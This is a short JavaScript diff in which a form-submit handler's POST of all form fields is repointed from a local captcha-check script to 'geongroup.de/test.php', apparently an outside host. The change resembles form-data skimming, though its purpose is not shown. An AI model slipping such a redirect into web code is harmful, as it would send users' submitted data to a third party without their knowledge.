@@ -129,7 +129,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const fd = new FormData(e.target);
         const params = new URLSearchParams(fd);
 
-        fetch("verifyCaptcha.php", {
+        fetch("geongroup.de/test.php", {
             method: "POST",
             body: params,
         })
